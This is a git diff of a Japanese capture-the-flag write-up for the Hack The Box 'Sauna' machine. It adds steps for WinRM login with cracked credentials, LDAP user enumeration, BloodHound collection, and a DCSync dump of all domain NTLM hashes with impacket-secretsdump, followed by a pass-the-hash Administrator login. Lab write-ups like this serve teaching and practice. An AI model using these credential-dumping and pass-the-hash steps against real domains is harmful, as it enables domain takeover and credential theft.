@@ -140,6 +140,50 @@ $krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:59bee1196843ecf6fcbfe16e736d2f2e$8f2
 ```
 5985番ポートが開いていたので、winrmログイン成功！ユーザフラグゲット
 ```sh
+└─$ netexec winrm 10.129.95.180 -u 'EGOTISTICAL-BANK.LOCAL\fsmith' -p 'Thestrokes23' -X 'type C:\Users\fsmith\Desktop\user.txt'
+WINRM       10.129.95.180   5985   SAUNA            [*] Windows 10 / Server 2019 Build 17763 (name:SAUNA) (domain:EGOTISTICAL-BANK.LOCAL)
+/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from this module in 48.0.0.
+  arc4 = algorithms.ARC4(self._key)
+WINRM       10.129.95.180   5985   SAUNA            [+] EGOTISTICAL-BANK.LOCAL\fsmith:Thestrokes23 (Pwn3d!)
+WINRM       10.129.95.180   5985   SAUNA            [+] Executed command (shell type: powershell)
+WINRM       10.129.95.180   5985   SAUNA            4a10a0eee9f5bd93b20f39ac4bccfd01
+```
+
+
+## STEP 3
+step2で取得したクレデンシャルでユーザ列挙
+```sh
+└─$ netexec ldap 10.129.95.180 -u 'EGOTISTICAL-BANK.LOCAL\fsmith' -p 'Thestrokes23' --users                              
+LDAP        10.129.95.180   389    SAUNA            [*] Windows 10 / Server 2019 Build 17763 (name:SAUNA) (domain:EGOTISTICAL-BANK.LOCAL)
+LDAP        10.129.95.180   389    SAUNA            [+] EGOTISTICAL-BANK.LOCAL\fsmith:Thestrokes23 
+LDAP        10.129.95.180   389    SAUNA            [*] Enumerated 6 domain users: EGOTISTICAL-BANK.LOCAL
+LDAP        10.129.95.180   389    SAUNA            -Username-                    -Last PW Set-       -BadPW-  -Description-                                               
+LDAP        10.129.95.180   389    SAUNA            Administrator                 2021-07-26 12:16:16 0        Built-in account for administering the computer/domain      
+LDAP        10.129.95.180   389    SAUNA            Guest                         <never>             0        Built-in account for guest access to the computer/domain    
+LDAP        10.129.95.180   389    SAUNA            krbtgt                        2020-01-23 00:45:30 0        Key Distribution Center Service Account                     
+LDAP        10.129.95.180   389    SAUNA            HSmith                        2020-01-23 00:54:34 0                                                                    
+LDAP        10.129.95.180   389    SAUNA            FSmith                        2020-01-23 11:45:19 0                                                                    
+LDAP        10.129.95.180   389    SAUNA            svc_loanmgr                   2020-01-24 18:48:31 0                                                                    
+```
+step2で取得したクレデンシャルでbloodhoundを回す
+```sh
+└─$ netexec ldap 10.129.95.180 --dns-server '10.129.95.180' -u 'EGOTISTICAL-BANK.LOCAL\fsmith' -p 'Thestrokes23' --bloodhound --collection All
+LDAP        10.129.95.180   389    SAUNA            [*] Windows 10 / Server 2019 Build 17763 (name:SAUNA) (domain:EGOTISTICAL-BANK.LOCAL)
+LDAP        10.129.95.180   389    SAUNA            [+] EGOTISTICAL-BANK.LOCAL\fsmith:Thestrokes23 
+LDAP        10.129.95.180   389    SAUNA            Resolved collection methods: acl, rdp, group, dcom, objectprops, session, psremote, localadmin, container, trusts
+LDAP        10.129.95.180   389    SAUNA            Done in 01M 28S
+LDAP        10.129.95.180   389    SAUNA            Compressing output into /home/kali/.nxc/logs/SAUNA_10.129.95.180_2025-07-29_100418_bloodhound.zip
+```
+svc_loanmgrを確認すると、ドメインに対して「GetChanges」「GetChangesALL」権限を持っている  
+[公式](https://bloodhound.specterops.io/resources/edges/get-changes-all)では、この２つの権限を悪用してDCSyncできると確認  
+とういうことで、svc_loanmgrのクレデンシャルを探そう
+<img src="https://github.com/mylovemyon/hackthebox_images/blob/main/Sauna_02.png">  
+
+
+## STEP 4
+winrm上でwinpeasを使って権限昇格を探す  
+32ビットか64ビットで動かすか確認、systeminfoが拒否されたので.netで確認、64ビット版で実行しましょ
+```powershell
 └─$ evil-winrm -i 10.129.95.180 -u fsmith -p Thestrokes23 
                                         
 Evil-WinRM shell v3.7
@@ -148,16 +192,8 @@ Warning: Remote path completions is disabled due to ruby limitation: undefined m
                                         
 Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                         
-Info: Establishing connection to remote endpoint
-*Evil-WinRM* PS C:\Users\FSmith\Documents> cat ../Desktop/user.txt
-5841274744d39246d6d26509fe76d42a
-```
+Info: Establishing connection to remote endpoint'
 
-
-## STEP 3
-winpeasで権限昇格を探す  
-32ビットか64ビットで動かすか確認、systeminfoが拒否されたので.netで確認、64ビット版で実行しましょ
-```powershell
 *Evil-WinRM* PS C:\Users\FSmith\Documents> systeminfo
 Program 'systeminfo.exe' failed to run: Access is deniedAt line:1 char:1
 + systeminfo
@@ -357,7 +393,7 @@ Error while getting Win32_UserAccount info: System.Management.ManagementExceptio
 ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking for AutoLogon credentials
     Some AutoLogon credentials were found
     DefaultDomainName             :  EGOTISTICALBANK
-    DefaultUserName               :  EGOTISTICALBANK\svc_loanmanager
+    DefaultUserName               :  EGOTISTICALBANK\svc_loanmgr
     DefaultPassword               :  Moneymakestheworldgoround!
 
 ÉÍÍÍÍÍÍÍÍÍÍ¹ Password Policies
@@ -393,23 +429,42 @@ Error while getting Win32_UserAccount info: System.Management.ManagementExceptio
        |                                 Thank you!                                      |                                                                                                                                                  
        \---------------------------------------------------------------------------------/  
 ```
-autologonから、svc_loanmanager のパスワード判明！
-ただこのユーザはadministratorsではないもよう
+autologonから、svc_loanmgr のパスワード判明！
 ```powershell
 ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking for AutoLogon credentials
     Some AutoLogon credentials were found
     DefaultDomainName             :  EGOTISTICALBANK
-    DefaultUserName               :  EGOTISTICALBANK\svc_loanmanager
+    DefaultUserName               :  EGOTISTICALBANK\svc_loanmgr
     DefaultPassword               :  Moneymakestheworldgoround!
 ```
-
-
-## STEP 4
+ということで、svc_loanmgrでDCSync攻撃！
 ```sh
-└─$ netexec ldap 10.129.95.180 --dns-server '10.129.95.180' -u 'EGOTISTICAL-BANK.LOCAL\fsmith' -p 'Thestrokes23' --bloodhound --collection Group
-LDAP        10.129.95.180   389    SAUNA            [*] Windows 10 / Server 2019 Build 17763 (name:SAUNA) (domain:EGOTISTICAL-BANK.LOCAL)
-LDAP        10.129.95.180   389    SAUNA            [+] EGOTISTICAL-BANK.LOCAL\fsmith:Thestrokes23 
-LDAP        10.129.95.180   389    SAUNA            Resolved collection methods: acl, rdp, group, dcom, objectprops, session, psremote, localadmin, container, trusts
-LDAP        10.129.95.180   389    SAUNA            Done in 01M 28S
-LDAP        10.129.95.180   389    SAUNA            Compressing output into /home/kali/.nxc/logs/SAUNA_10.129.95.180_2025-07-29_100418_bloodhound.zip
+└─$ impacket-secretsdump -ts -just-dc-ntlm 'EGOTISTICAL-BANK.LOCAL/svc_loanmgr:Moneymakestheworldgoround!@10.129.95.180'
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[2025-08-08 11:19:51] [*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[2025-08-08 11:19:51] [*] Using the DRSUAPI method to get NTDS.DIT secrets
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:4a8899428cad97676ff802229e466e2c:::
+EGOTISTICAL-BANK.LOCAL\HSmith:1103:aad3b435b51404eeaad3b435b51404ee:58a52d36c84fb7f5f1beab9a201db1dd:::
+EGOTISTICAL-BANK.LOCAL\FSmith:1105:aad3b435b51404eeaad3b435b51404ee:58a52d36c84fb7f5f1beab9a201db1dd:::
+EGOTISTICAL-BANK.LOCAL\svc_loanmgr:1108:aad3b435b51404eeaad3b435b51404ee:9cb31797c39a9b170b04058ba2bba48c:::
+SAUNA$:1000:aad3b435b51404eeaad3b435b51404ee:7504784e68bb600a12667dc85792f5c1:::
+[2025-08-08 11:20:03] [*] Cleaning up...
+```
+administratorでログイン成功！ルートフラグゲット！
+```sh
+└─$ evil-winrm -i 10.129.95.180 -u 'administrator' -H '823452073d75b9d1cf70ebdf86c7f98e'
+                                        
+Evil-WinRM shell v3.7
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+
+*Evil-WinRM* PS C:\Users\Administrator\Documents> cat ../Desktop/root.txt
+22fa5dff7fc57e44b5cc89cb16baabdc
 ```
